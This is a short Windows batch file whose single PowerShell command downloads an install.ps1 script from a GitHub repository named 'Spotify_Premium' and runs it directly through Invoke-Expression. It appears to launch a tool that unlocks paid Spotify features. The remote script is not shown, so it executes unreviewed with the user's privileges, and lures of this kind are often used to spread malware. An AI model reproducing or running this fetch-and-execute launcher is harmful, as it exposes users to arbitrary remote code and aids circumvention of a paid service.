@echo off
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/senko-bin/Spotify_Premium/main/install.ps1' | Invoke-Expression}"
pause
exit /b